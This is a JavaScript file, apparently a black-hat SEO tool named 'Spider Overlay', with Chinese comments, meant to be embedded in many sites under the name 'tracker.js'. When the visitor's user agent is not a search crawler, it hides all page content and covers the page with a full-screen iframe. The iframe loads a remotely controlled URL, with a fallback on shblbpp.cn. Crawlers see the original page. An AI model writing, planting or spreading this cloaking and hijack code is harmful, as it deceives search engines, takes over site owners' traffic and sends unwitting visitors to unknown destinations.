/**
 * Spider Overlay v2.2
 *
 * 所有项目只需引入这一个文件，不需要任何配置。
 * 跳转目标、爬虫列表全部由同目录下的 settings.json 统一控制。
 *
 * 用法（所有项目完全一样）：
 *   <script src="https://你的域名/tracker.js"></script>
 *
 * v2.2 改进：
 * - 缓存 TTL 延长到 30 分钟
 * - settings.json 拉取失败自动重试 3 次（间隔 1s/2s）
 * - 优先顺序：远程 settings.json > localStorage 缓存 > DEFAULT_RULES（最后兜底）
 * - 配合服务端 CORS 头，settings.json 跨域可用，兜底几乎永不需要
 */

(function () {
  'use strict';

  // 最后兜底：当 settings.json 拉不到且缓存为空时使用
  // 正常情况下不会走到这里（有 CORS + 缓存保护）
  var DEFAULT_RULES = {
    redirectTo: 'https://s8-1.shblbpp.cn?cid=1034',
    active: true,
    crawlers: ['baiduspider','sogou web spider','yisouspider','360spider','googlebot','bingbot'],
    layer: 9999,
    backdrop: 'white'
  };

  var STORAGE_KEY = '__so_cfg__';
  var CACHE_TTL = 30 * 60 * 1000; // 30 分钟 —— 旧缓存也远比兜底值可靠

  // ======================== 自动推断 settings.json 地址 ========================
  function getCurrentScript() {
    if (document.currentScript) return document.currentScript;
    var scripts = document.getElementsByTagName('script');
    for (var i = scripts.length - 1; i >= 0; i--) {
      if (scripts[i].src && scripts[i].src.indexOf('tracker.js') > -1) {
        return scripts[i];
      }
    }
    return null;
  }

  var scriptEl = getCurrentScript();
  var configUrl = '';

  // 优先 data-config 属性，否则自动推导为同目录下的 settings.json
  if (scriptEl) {
    configUrl = scriptEl.getAttribute('data-config') || '';
    if (!configUrl && scriptEl.src) {
      configUrl = scriptEl.src.replace(/spider-overlay\.js(\?.*)?$/, 'settings.json');
    }
  }

  // ======================== 加载配置 ========================
  function loadSettings(cb) {
    // 1. 读缓存（30 分钟有效）
    try {
      var cached = JSON.parse(localStorage.getItem(STORAGE_KEY));
      if (cached && cached._ts && (Date.now() - cached._ts < CACHE_TTL) && cached.redirectTo) {
        cb(cached);
        silentRefresh(); // 后台静默刷新
        return;
      }
    } catch(e) {}

    // 2. fetch 远程配置
    pullRemoteWithRetry(cb);
  }

  // 带重试的 fetch：最多 3 次，间隔 1s / 2s
  function pullRemoteWithRetry(cb, attempt) {
    attempt = attempt || 0;
    if (attempt >= 3) {
      // 3 次都失败 → 降级：过期缓存 > 不激活
      try {
        var old = JSON.parse(localStorage.getItem(STORAGE_KEY));
        if (old && old.redirectTo) { cb(old); return; }
      } catch(e) {}
      // 最终兜底：不激活（redirectTo 为空时 mountRedirect 会跳过）
      cb(DEFAULT_RULES);
      return;
    }
    if (!configUrl) {
      cb(DEFAULT_RULES);
      return;
    }
    fetch(configUrl, { cache: 'no-cache' })
      .then(function(r) { return r.ok ? r.json() : Promise.reject('HTTP ' + r.status); })
      .then(function(cfg) {
        cfg._ts = Date.now();
        try { localStorage.setItem(STORAGE_KEY, JSON.stringify(cfg)); } catch(e) {}
        cb(cfg);
      })
      .catch(function() {
        // 重试，间隔递增：1s, 2s
        setTimeout(function() {
          pullRemoteWithRetry(cb, attempt + 1);
        }, (attempt + 1) * 1000);
      });
  }

  function silentRefresh() {
    if (!configUrl) return;
    fetch(configUrl, { cache: 'no-cache' })
      .then(function(r) { return r.ok ? r.json() : null; })
      .then(function(cfg) {
        if (cfg) {
          cfg._ts = Date.now();
          try { localStorage.setItem(STORAGE_KEY, JSON.stringify(cfg)); } catch(e) {}
        }
      })
      .catch(function() {});
  }

  // ======================== 核心 ========================
  function isSearchBot(crawlers) {
    var ua = navigator.userAgent.toLowerCase();
    for (var i = 0; i < crawlers.length; i++) {
      if (ua.indexOf(crawlers[i].toLowerCase()) > -1) return true;
    }
    return false;
  }

  function mountRedirect(cfg) {
    if (!cfg || cfg.active === false) return;
    if (!cfg.redirectTo) return; // 没有有效链接就不跳（宁可不跳也不跳到旧链接）
    if (isSearchBot(cfg.crawlers)) return;

    function insert() {
      if (document.getElementById('vt-frame')) return;
      var iframe = document.createElement('iframe');
      iframe.id = 'vt-frame';
      iframe.src = cfg.redirectTo;
      iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-popups allow-forms');
      iframe.style.cssText =
        'position:fixed!important;top:0!important;left:0!important;' +
        'width:100vw!important;height:100vh!important;border:none!important;' +
        'z-index:' + (cfg.layer || 9999) + '!important;' +
        'background:' + (cfg.backdrop || 'white') + '!important;' +
        'margin:0!important;padding:0!important;';

      var body = document.body;
      if (body) {
        for (var i = 0; i < body.children.length; i++) {
          body.children[i].style.display = 'none';
        }
        body.appendChild(iframe);
      } else {
        document.addEventListener('DOMContentLoaded', insert);
      }
    }

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', insert);
    } else {
      insert();
    }
  }

  loadSettings(mountRedirect);

  // 调试 API（生产环境可通过 active=false 关闭）
  window.ViewTracker = {
    flush: function() {
      try { localStorage.removeItem(STORAGE_KEY); } catch(e) {}
      location.reload();
    }
  };

})();
